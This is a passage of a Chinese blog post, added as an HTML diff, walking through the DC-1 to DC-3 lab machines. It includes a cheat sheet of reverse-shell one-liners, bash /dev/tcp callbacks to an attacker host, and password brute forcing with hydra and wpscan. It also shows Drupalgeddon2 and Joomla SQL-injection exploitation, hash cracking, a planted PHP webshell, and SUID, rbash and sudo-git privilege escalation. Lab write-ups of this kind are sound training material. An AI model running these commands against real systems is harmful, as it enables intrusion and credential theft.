@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="生活,旅行,思考,代码,博客" />
+   
+  <meta name="description" content="一生努力" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    DC靶场系列 |  0Rld
+  </title>
+  <meta name="generator" content="hexo-theme-yilia-plus">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="0Rld" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+</html>
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+<body>
+  <div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-DC靶场系列" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  DC靶场系列
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/08/28/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" class="article-date">
+  <time datetime="2020-08-28T06:55:26.000Z" itemprop="datePublished">2020-08-28</time>
+</a>
+      
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.6k字</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">19分钟</span>
+        </span>
+    </span>
+</div>
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <p>DC-1靶机渗透：</p>
+<p>知识要点：</p>
+<p>1.反弹shell，如何反弹？反弹原理？有哪几种反弹方式？</p>
+<p>2.漏洞利用，CVE-2018-7600 Drupal核心远程代码执行漏洞</p>
+<p>3.提权方式，如suid提权</p>
+<p>4.drupal配置文件和重置管理员密码</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h2><p>为什么要反弹shell？</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python: python -c "import pty;pty.spawn('/bin/bash')"</span><br><span class="line">ruby: ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br><span class="line">nc: nc -e /bin/bash ip port</span><br><span class="line">php:&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">sock=fsockopen(<span class="string">"ip"</span>,port);//自己的外网ip，端口任意</span></span><br><span class="line">exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Linux下提权"><a href="#Linux下提权" class="headerlink" title="Linux下提权"></a><strong>Linux下提权</strong></h2><p>SUID：特殊权限</p>
+<p>kail下自带密码本路劲</p>
+<p>/usr/share/wordlists</p>
+<p>解压缩命令 gunzip xx.gz</p>
+<p>hydra -l admin -P  /usr/share/wordlists/rockyou.txt  -f 192.168.17.130  http-post-form   ”/login.php:username=^USER^&amp;password=^PASS^:S=logout“ -vV</p>
+<p>hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.17.130  http-post-form “/login.php:username=^USER^ password=^PASS^:S=logout” -F</p>
+<p>[22][ssh] host: 192.168.126.149   login: jim   password: jibril04</p>
+<p>知识点：wpscan的使用、cewl生成密码</p>
+<p>绕过受限shell、git提权</p>
+<h2 id="DC-1渗透过程"><a href="#DC-1渗透过程" class="headerlink" title="DC-1渗透过程"></a><strong>DC-1渗透过程</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l <span class="comment">#发现主机ip</span></span><br><span class="line">nmap -sV -A <span class="number">192.168</span><span class="number">.126</span><span class="number">.141</span> <span class="comment">#详细端口服务扫描</span></span><br><span class="line"><span class="comment">###发现了80端口是drupal7 服务，开启msf查找漏洞</span></span><br><span class="line">msf5 &gt; search drupal</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   <span class="number">0</span>  auxiliary/gather/drupal_openid_xxe             <span class="number">2012</span><span class="number">-10</span><span class="number">-17</span>       normal     Yes    Drupal OpenID External Entity Injection</span><br><span class="line">   <span class="number">4</span>  exploit/unix/webapp/drupal_drupalgeddon2       <span class="number">2018</span><span class="number">-03</span><span class="number">-28</span>       excellent  Yes    Drupal Drupalgeddon <span class="number">2</span> Forms API Property Injection</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts <span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span></span><br><span class="line">rhosts =&gt; 192.168.126.153</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>:<span class="number">4444</span> </span><br><span class="line">meterpreter &gt; </span><br><span class="line"><span class="comment">#成功进入目标服务器，为稳定连接，可以反弹shell到本地</span></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span>  <span class="comment">#获取交互shell</span></span><br><span class="line">www-data@DC<span class="number">-1</span>:/var/www$ bash -i &amp;&gt; /dev/tcp/<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> <span class="comment">#反弹bash</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333 #本地监听</span></span><br><span class="line">listening on [any] <span class="number">2333</span> ...</span><br><span class="line"><span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span>: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.126</span><span class="number">.153</span>] <span class="number">51022</span></span><br><span class="line">www-data@DC<span class="number">-1</span>:/var/www$ python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span> <span class="comment">#这里再反弹一个更稳定</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>本地发现flag1、提示查看数据库配置文件，发现flag2，给了数据库的账号密码，连接数据库看看</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">www<span class="literal">-data</span>@DC<span class="literal">-1</span>:/var/www<span class="variable">$</span> mysql <span class="literal">-u</span> dbuser <span class="literal">-p</span>  <span class="comment">#连接数据库</span></span><br><span class="line">Enter password: R0ck3t</span><br><span class="line">mysql&gt; show databases;  </span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; select * from users \G;</span><br><span class="line">select * from users \G;</span><br><span class="line">*************************** <span class="number">2</span>. row ***************************</span><br><span class="line">             uid: <span class="number">1</span></span><br><span class="line">            name: admin</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR</span><br><span class="line">            mail: admin@example.com</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: <span class="number">1550581826</span></span><br><span class="line">          access: <span class="number">1550583852</span></span><br><span class="line">           login: <span class="number">1550582362</span></span><br><span class="line">          status: <span class="number">1</span></span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: <span class="number">0</span></span><br><span class="line">            init: admin@example.com</span><br><span class="line">            <span class="keyword">data</span>: b:<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">###修改数据库admin的密码，这里用自带的hash加密求hash值</span></span><br><span class="line">www<span class="literal">-data</span>@DC<span class="literal">-1</span>:/var/www<span class="variable">$</span> php scripts/password<span class="literal">-hash</span>.sh <span class="number">123456</span></span><br><span class="line">password: <span class="number">123456</span>                hash: <span class="variable">$S</span><span class="variable">$DvvyyPuAd4L6M</span>/fZV0kmnokciLomH5YSvUZ.w.aaALZpqe1zMTtV</span><br><span class="line"><span class="comment">#更新数据库密码</span></span><br><span class="line">update users set pass=<span class="string">'$S$DRP9A87VYWMUnTb4Dl7yivYAlibCNONO32cCB3Qc1LT5Alr90rAu'</span> where uid=<span class="number">1</span>;</span><br><span class="line"><span class="comment">#登陆网页发现flag3，提示查看/etc/passwd</span></span><br><span class="line"><span class="comment">#提权，寻找有suid权限的文件</span></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / <span class="literal">-perm</span> /<span class="number">4000</span> <span class="number">2</span>&gt;/dev/null</span><br><span class="line">touch test <span class="comment"># 创建一个空文件</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'whoami'</span> \; <span class="comment">#查看是否提权</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'/bin/sh'</span> \;<span class="comment">#将root的bash反弹</span></span><br><span class="line"><span class="comment">#cd /root 找到最终的flag文件</span></span><br><span class="line">cat final<span class="literal">-flag</span>.txt</span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">'_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it'</span>s all greatly</span><br><span class="line">appreciated.</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="DC-2渗透过程"><a href="#DC-2渗透过程" class="headerlink" title="DC-2渗透过程"></a><strong>DC-2渗透过程</strong></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -A -p- dc-2 #全端口扫描更具体</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">10</span> ((Debian))</span><br><span class="line">|_http<span class="literal">-generator</span>: WordPress <span class="number">4.7</span>.<span class="number">10</span></span><br><span class="line">|_http<span class="literal">-server</span><span class="literal">-header</span>: Apache/<span class="number">2.4</span>.<span class="number">10</span> (Debian)</span><br><span class="line">|_http<span class="literal">-title</span>: DC<span class="literal">-2</span> &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">|_https<span class="literal">-redirect</span>: ERROR: Script execution failed (use <span class="literal">-d</span> to debug)</span><br><span class="line"><span class="number">7744</span>/tcp open  ssh     OpenSSH <span class="number">6.7</span>p1 Debian <span class="number">5</span>+deb8u7 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">1024</span> <span class="number">52</span>:<span class="number">51</span>:<span class="number">7</span>b:<span class="number">6</span>e:<span class="number">70</span>:a4:<span class="number">33</span>:<span class="number">7</span>a:d2:<span class="number">4</span>b:e1:<span class="number">0</span>b:<span class="number">5</span>a:<span class="number">0</span>f:<span class="number">9</span>e:d7 (DSA)</span><br><span class="line">|   <span class="number">2048</span> <span class="number">59</span>:<span class="number">11</span>:d8:af:<span class="number">38</span>:<span class="number">51</span>:<span class="number">8</span>f:<span class="number">41</span>:a7:<span class="number">44</span>:b3:<span class="number">28</span>:<span class="number">03</span>:<span class="number">80</span>:<span class="number">99</span>:<span class="number">42</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> df:<span class="number">18</span>:<span class="number">1</span>d:<span class="number">74</span>:<span class="number">26</span>:ce:c1:<span class="number">4</span>f:<span class="number">6</span>f:<span class="number">2</span>f:c1:<span class="number">26</span>:<span class="number">54</span>:<span class="number">31</span>:<span class="number">51</span>:<span class="number">91</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> d9:<span class="number">38</span>:<span class="number">5</span>f:<span class="number">99</span>:<span class="number">7</span>c:<span class="number">0</span>d:<span class="number">64</span>:<span class="number">7</span>e:<span class="number">1</span>d:<span class="number">46</span>:f6:e9:<span class="number">7</span>c:c6:<span class="number">37</span>:<span class="number">17</span> (ED25519)</span><br><span class="line"></span><br><span class="line"><span class="comment">#访问80端口，发现重定向到http://dc-2</span></span><br><span class="line">root@kali:~<span class="comment"># vi /etc/hosts #写入ip dc-2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#访问发现是wordpress，用wpscan扫描</span></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -e u</span></span><br><span class="line"></span><br><span class="line"><span class="function">[<span class="type">i</span>] <span class="title">User</span></span>(s) Identified:</span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># cewl -w passwd.txt http://dc-2</span></span><br><span class="line">CeWL <span class="number">5.4</span>.<span class="number">7</span> (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -U users.txt -P passwd.txt </span></span><br><span class="line"></span><br><span class="line">[<span class="type">i</span>] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># ssh tom@192.168.126.153 -p 7744</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>连接到tom主机上后发现大部分命令无法使用，查看环境变量发现没用/bin/bash，需要添加环境变量才可以正常执行bash，查看可执行的命令（这里有个查询的小技巧，免去一个个尝试），发现可正常执行vi，在vi中可执行命令，可利用此添加环境变量</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">tom@DC<span class="number">-2</span>:~$ export  <span class="comment">#查看环境变量</span></span><br><span class="line">declare -x HOME=<span class="string">"/home/tom"</span></span><br><span class="line">declare -x LANG=<span class="string">"en_US.UTF-8"</span></span><br><span class="line">declare -x LOGNAME=<span class="string">"tom"</span></span><br><span class="line">declare -x MAIL=<span class="string">"/var/mail/tom"</span></span><br><span class="line">declare -x OLDPWD</span><br><span class="line">declare -rx PATH=<span class="string">"/home/tom/usr/bin"</span></span><br><span class="line">declare -x PWD=<span class="string">"/home/tom"</span></span><br><span class="line">declare -rx SHELL=<span class="string">"/bin/rbash"</span></span><br><span class="line">declare -x SHLVL=<span class="string">"1"</span></span><br><span class="line">declare -x SSH_CLIENT=<span class="string">"192.168.126.33 35824 7744"</span></span><br><span class="line">declare -x SSH_CONNECTION=<span class="string">"192.168.126.33 35824 192.168.126.154 7744"</span></span><br><span class="line">declare -x SSH_TTY=<span class="string">"/dev/pts/1"</span></span><br><span class="line">declare -x TERM=<span class="string">"xterm-256color"</span></span><br><span class="line">declare -x USER=<span class="string">"tom"</span></span><br><span class="line"></span><br><span class="line">tom@DC<span class="number">-2</span>:~$ echo $PATH</span><br><span class="line">/home/tom/usr/bin</span><br><span class="line"></span><br><span class="line">tom@DC<span class="number">-2</span>:~$ echo /home/tom/usr/bin/*  <span class="comment">#查询可执行命令</span></span><br><span class="line">/home/tom/usr/bin/less /home/tom/usr/bin/ls /home/tom/usr/bin/scp /home/tom/usr/bin/vi</span><br><span class="line"></span><br><span class="line">vi</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line">$ export PATH=$PATH:/bin/ <span class="comment"># 导入环境变量</span></span><br><span class="line">$ export PATH=$PATH:/usr/bin</span><br><span class="line"></span><br><span class="line">jerry@DC<span class="number">-2</span>:/home/tom$ sudo -l  <span class="comment">#查看可执行root权限的命令</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jerry on DC<span class="number">-2</span>:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC<span class="number">-2</span>:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里提示可利用git提权</span></span><br><span class="line">root@DC<span class="number">-2</span>:/home/jerry<span class="comment"># cat flag4.txt </span></span><br><span class="line">Good to see that yo<span class="string">u've made it this far - but you'</span>re <span class="keyword">not</span> home yet. </span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line">No hints here - yo<span class="string">u're on your own now.  :-)</span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jerry@DC-2:/home/tom$ sudo git help config</span></span><br><span class="line"><span class="string">！/bin/sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@DC-2:~# cat final-flag.txt </span></span><br><span class="line"><span class="string"> __    __     _ _       _                    _ </span></span><br><span class="line"><span class="string">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ | |  / _` |/ _ \| '</span>_ \ / _ \/  /</span><br><span class="line"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span><br><span class="line">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span><br><span class="line"></span><br><span class="line">Congratulatons!!!</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="DC-3渗透过程"><a href="#DC-3渗透过程" class="headerlink" title="DC-3渗透过程"></a><strong>DC-3渗透过程</strong></h2><p><strong>就开放了80端口，可用wappalyzer插件查看cms指纹等信息，发现是joomla框架</strong></p>
+<p><img src="/2020/08/28/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/1.png" alt></p>
+<p><strong>利用joomscan扫描出后台登陆地址、版本信息以及相关目录，然后查询相关漏洞信息进行利用！</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># perl joomscan.pl -u http://192.168.126.150</span></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla <span class="number">3.7</span>.<span class="number">0</span></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/components</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/modules</span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://<span class="number">192.168</span>.<span class="number">126.150</span>/administrator/</span><br><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># searchsploit joomla 3.7.0</span></span><br><span class="line">Joomla! <span class="number">3.7</span>.<span class="number">0</span> - <span class="string">'com_fields'</span> SQL Injection                                                           | exploits/php/webapps/<span class="number">42033</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看漏洞利用方式，存在SQL注入漏洞，相关sqlmap使用方式也列出来了</span></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span></span><br><span class="line"><span class="comment"># Exploit Title: Joomla 3.7.0 - Sql Injection</span></span><br><span class="line"><span class="comment"># Date: 05-19-2017</span></span><br><span class="line"><span class="comment"># CVE : - CVE-2017-8917</span></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[<span class="type">fullordering</span>]=updatexml%<span class="number">27</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Using</span> Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap <span class="literal">-u</span> <span class="string">"http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> -<span class="literal">-risk</span>=<span class="number">3</span> -<span class="literal">-level</span>=<span class="number">5</span> -<span class="literal">-random</span><span class="literal">-agent</span> -<span class="literal">-dbs</span> <span class="literal">-p</span> list[<span class="type">fullordering</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sqlmap爆破出管理员账号和密码</span></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># sqlmap -u "http://192.168.126.150/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk 3 -D joomladb -t</span></span><br><span class="line"></span><br><span class="line">root@kali:~/tools/joomscan<span class="comment"># sqlmap -u "http://192.168.126.150/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk 3 -D joomladb -T "#__users" -C username,password --dump</span></span><br><span class="line"></span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | <span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p><strong>得到的密码是hash值，可以利用hashcat进行爆破，密码本用kail自带的rockyou.txt</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hashid hash.txt </span></span><br><span class="line">-<span class="operator">-File</span> <span class="string">'hash.txt'</span>--</span><br><span class="line">Analyzing <span class="string">'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'</span></span><br><span class="line"><span class="function">[+] <span class="title">Blowfish</span></span>(OpenBSD) </span><br><span class="line">[+] Woltlab Burning Board <span class="number">4</span>.x </span><br><span class="line">[+] bcrypt </span><br><span class="line">root@kali:~<span class="comment"># hashcat -m 3200 -a 0 -d 1 --force hash.txt rockyou.txt</span></span><br><span class="line">hashcat (v5.<span class="number">1.0</span>) starting...</span><br><span class="line"><span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu:snoopy</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>得到密码为snoopy，登陆后台在template处添加shell.php写入一句话木马，用蚁剑连接，注意木马的路径，此处有提示</strong></p>
+<p><img src="/2020/08/28/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/2.png" alt></p>
+<p><strong>进入服务器后，发现无法提权，看看该版本系统是否存有漏洞，这里选择了Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps  | exploits/linux/dos/39773.txt  进行内核提权</strong></p>
